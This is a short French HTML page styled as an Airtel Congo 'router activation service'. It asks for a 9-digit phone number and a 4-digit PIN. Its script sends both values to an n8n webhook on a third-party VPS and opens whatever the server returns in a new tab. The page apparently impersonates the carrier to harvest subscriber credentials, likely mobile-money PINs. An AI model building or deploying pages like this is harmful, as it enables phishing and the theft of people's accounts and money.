<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Formulaire d'Authentification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #f2f2f2;
    }
    header {
      display: flex;
      align-items: center;
      padding: 10px;
      background-color: #FF0000;
      color: white;
    }
    header img {
      height: 50px;
      margin-right: 30px;
    }
    .card { 
      background: white; 
      padding: 20px; 
      border-radius: 8px; 
      max-width: 500px; 
      margin: 40px auto; 
      box-shadow: 0 0 10px rgba(0,0,0,0.1); 
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    label {
      font-weight: bold;
    }
    input {
      padding: 10px;
      width: 300px;
      font-size: 16px;
    }
    button {
      padding: 12px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      width: 150px;
      align-self: center;
    }
    button:hover {
      background-color: #0056b3;
    }
    footer {
      text-align: center;
      margin: 40px 0 20px;
      color: #555;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://raw.githubusercontent.com/christale-kib/routeur-paiement/main/Airtel_Congo.jpg" alt="Logo" />
    <h1>Service d'activation de routeur</h1>
  </header>

  <div class="card">
    <form id="loginForm">
      <label for="numero">Numéro (9 chiffres)</label>
      <input type="text" id="numero" name="numero" pattern="\d{9}" inputmode="numeric" maxlength="9" required />

      <label for="password">Mot de passe (4 chiffres)</label>
      <input type="password" id="password" name="password" pattern="\d{4}" inputmode="numeric" maxlength="4" required />

      <button type="submit">Valider</button>
    </form>
  </div>

  <footer>
    <p>&copy; 2025 - Service d'activation de Routeur. Tous droits réservés.</p>
  </footer>

  <script>
document.getElementById("loginForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const numero = document.getElementById("numero").value;
  const password = document.getElementById("password").value;

  try {
    const response = await fetch("https://n8n.srv878521.hstgr.cloud/webhook-test/AuthentReport", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ numero, password }),
    });

    if (!response.ok) {
      alert("Erreur lors de la connexion au serveur");
      return;
    }

    const blob = await response.blob(); // récupère la réponse binaire (HTML)
    const url = URL.createObjectURL(blob); // crée une URL locale pour blob
    console.log("Réponse reçue, création URL blob");  
    console.log(url);  
    window.open(url, "_blank"); // ouvre dans un nouvel onglet

  } catch (err) {
    console.error("Erreur d'envoi :", err);
    alert("Erreur lors de la communication avec le serveur");
  }
});
</script>



</body>
</html>
